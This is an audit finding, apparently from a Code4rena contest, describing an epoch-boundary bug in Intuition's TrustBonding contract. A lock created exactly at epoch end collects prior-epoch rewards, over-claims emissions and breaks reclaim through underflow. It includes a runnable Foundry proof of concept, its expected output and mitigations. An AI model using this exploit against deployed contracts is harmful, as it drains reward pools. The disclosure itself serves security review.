      "body": "## Finding description and impact\n\n### Summary\n`TrustBonding` computes prior-epoch rewards using epoch-end snapshots at `epochTimestampEnd(epoch)`, while `VotingEscrow` snapshot lookup is inclusive (`<= timestamp`).\nBecause of this, a lock action performed exactly at epoch boundary can be counted into the previous epoch entitlement window.\n\nThe claim path then adds user rewards into `totalClaimedRewardsForEpoch[prevEpoch]` without an epoch-cap guard, allowing `totalClaimedRewardsForEpoch(epoch)` to exceed epoch emissions.\n\nWhen reclaim logic computes unclaimed as `epochRewards - claimedRewards`, epochs with over-claimed totals underflow and revert.\n\n### Root cause details\n\n1. Inclusive prior-epoch balance reads:\n- [`totalBondedBalanceAtEpochEnd` / `userBondedBalanceAtEpochEnd`](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/protocol/emissions/TrustBonding.sol#L194-L213)\n\n2. Eligibility uses those values:\n- [`_userEligibleRewardsForEpoch`](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/protocol/emissions/TrustBonding.sol#L475-L491)\n\n3. No epoch-cap in claim aggregate accounting:\n- [`claimRewards` aggregate increment](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/protocol/emissions/TrustBonding.sol#L348-L387)\n\n4. Reclaim underflow point:\n- [`getUnclaimedRewardsForEpoch` subtraction](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/protocol/emissions/TrustBonding.sol#L320-L340)\n\n5. Inclusive timestamp lookup in ve snapshots:\n- [`_find_timestamp_epoch`](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/external/curve/VotingEscrow.sol#L544-L576)\n- [`_find_user_timestamp_epoch` + `_balanceOf`](https://github.com/code-423n4/2026-03-intuition/blob/314b7d4d9ccbaf27e4484a6c0706af83d3f75f36/src/external/curve/VotingEscrow.sol#L590-L638)\n\n### Impact\nA boundary-time injector can claim prior-epoch rewards despite not being a genuine prior-epoch participant, causing over-distribution and reclaim failures.\n\nObserved PoC outputs:\n- `epoch1_emissions = 1000000000000000000000`\n- `first_claim = 1000000000000000000000`\n- `second_claim = 999666777562686266743`\n- `total_claimed = 1999666777562686266743`\n- `excess_bps = 9996`\n\nBoundary sensitivity:\n- `offset 0` gives positive retroactive claimable.\n- `offset +1s` gives `0` retroactive claimable.\n\nSeverity rationale:\n- Impact is material once triggered (over-claim + reclaim DoS on affected epoch).\n- Exploitability is constrained by exact boundary timing (`offset == 0`), so Medium is appropriate.\n\n## Recommended mitigation steps\n\n1. Make prior-epoch reward snapshots boundary-exclusive (`epochEnd - 1` or strict `< epochEnd` semantics).\n2. Enforce per-epoch accounting invariant: `totalClaimedRewardsForEpoch[epoch] <= emissionsForEpoch(epoch)`.\n3. Harden reclaim subtraction path: if `claimedRewards >= epochRewards`, return `0` (or revert with explicit custom error) instead of panic underflow.",
      "proofOfConcept": "## Proof of Concept (PoC)\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.29;\n\nimport { console2 } from \"forge-std/src/console2.sol\";\nimport { TrustBondingBase } from \"tests/unit/TrustBonding/TrustBondingBase.t.sol\";\n\n/// @notice Minimal runnable PoC for epoch-boundary replay/injection.\n/// @dev Run with:\n/// forge test --match-path \"tests/unit/TrustBonding/PoC_M_EpochBoundaryReplay.t.sol\" -vv\ncontract PoC_M_EpochBoundaryReplay is TrustBondingBase {\n    uint256 private constant SMALL_LOCK = 1 ether;\n    uint256 private constant LARGE_LOCK = 100_000 ether;\n\n    function setUp() public override {\n        super.setUp();\n        vm.deal(address(protocol.satelliteEmissionsController), 100_000_000 ether);\n    }\n\n    function test_submissionValidity_overclaim_and_reclaim_breakage() external {\n        address staker = makeAddr(\"poc-staker\");\n        address injector = makeAddr(\"poc-injector\");\n        _setupUserWrappedTokenAndTrustBonding(staker);\n        _setupUserWrappedTokenAndTrustBonding(injector);\n\n        uint256 stakerUnlock = _calculateUnlockTime(DEFAULT_LOCK_DURATION);\n        resetPrank(staker);\n        protocol.trustBonding.create_lock(SMALL_LOCK, stakerUnlock);\n\n        uint256 epochOneEnd = protocol.trustBonding.epochTimestampEnd(1);\n        vm.warp(epochOneEnd);\n        assertEq(protocol.trustBonding.currentEpoch(), 2, \"must be at epoch-2 start\");\n\n        uint256 epochEmissions = protocol.trustBonding.emissionsForEpoch(1);\n        uint256 firstClaim = _claim(staker);\n        assertEq(firstClaim, epochEmissions, \"sole staker should claim full epoch-1 emissions\");\n\n        uint256 injectorUnlock = _calculateUnlockTime(14 days);\n        resetPrank(injector);\n        protocol.trustBonding.create_lock(LARGE_LOCK, injectorUnlock);\n        uint256 secondClaim = _claim(injector);\n\n        uint256 totalClaimed = protocol.trustBonding.totalClaimedRewardsForEpoch(1);\n        uint256 excess = totalClaimed - epochEmissions;\n        uint256 excessBps = excess * 10_000 / epochEmissions;\n\n        console2.log(\"epoch1_emissions\", epochEmissions);\n        console2.log(\"first_claim\", firstClaim);\n        console2.log(\"second_claim\", secondClaim);\n        console2.log(\"total_claimed\", totalClaimed);\n        console2.log(\"excess_bps\", excessBps);\n\n        assertGt(secondClaim, 0, \"boundary injector should not be able to claim for prior epoch\");\n        assertGt(totalClaimed, epochEmissions, \"total claimed should not exceed epoch emissions\");\n\n        vm.warp(protocol.trustBonding.epochTimestampEnd(2));\n        vm.expectRevert();\n        protocol.trustBonding.getUnclaimedRewardsForEpoch(1);\n    }\n\n    function test_submissionValidity_boundary_sensitivity_offset0_vs_plus1() external {\n        address offsetZeroUser = makeAddr(\"poc-offset-zero\");\n        address offsetPlusOneUser = makeAddr(\"poc-offset-plus-one\");\n        _setupUserWrappedTokenAndTrustBonding(offsetZeroUser);\n        _setupUserWrappedTokenAndTrustBonding(offsetPlusOneUser);\n\n        uint256 epochOneEnd = protocol.trustBonding.epochTimestampEnd(1);\n\n        vm.warp(epochOneEnd);\n        uint256 unlock0 = _calculateUnlockTime(14 days);\n        resetPrank(offsetZeroUser);\n        protocol.trustBonding.create_lock(LARGE_LOCK, unlock0);\n        uint256 claimableAtOffset0 = protocol.trustBonding.getUserCurrentClaimableRewards(offsetZeroUser);\n\n        vm.warp(epochOneEnd + 1);\n        uint256 unlock1 = _calculateUnlockTime(14 days);\n        resetPrank(offsetPlusOneUser);\n        protocol.trustBonding.create_lock(LARGE_LOCK, unlock1);\n        uint256 claimableAtOffsetPlusOne = protocol.trustBonding.getUserCurrentClaimableRewards(offsetPlusOneUser);\n\n        console2.log(\"claimable_offset_0\", claimableAtOffset0);\n        console2.log(\"claimable_offset_plus_1\", claimableAtOffsetPlusOne);\n\n        assertGt(claimableAtOffset0, 0, \"offset 0 should produce retroactive claimable rewards\");\n        assertEq(claimableAtOffsetPlusOne, 0, \"offset +1 should not produce retroactive claimable rewards\");\n    }\n\n    function _claim(address user) internal returns (uint256 claimedAmount) {\n        uint256 beforeBalance = user.balance;\n        resetPrank(user);\n        protocol.trustBonding.claimRewards(user);\n        claimedAmount = user.balance - beforeBalance;\n    }\n}\n\n\nRun:\nforge test --match-path \"tests/unit/TrustBonding/PoC_M_EpochBoundaryReplay.t.sol\" -vv\n\nExpected key output lines:\nclaimable_offset_0 1000000000000000000000\nclaimable_offset_plus_1 0\nepoch1_emissions 1000000000000000000000\nfirst_claim 1000000000000000000000\nsecond_claim 999666777562686266743\ntotal_claimed 1999666777562686266743\nexcess_bps 9996",
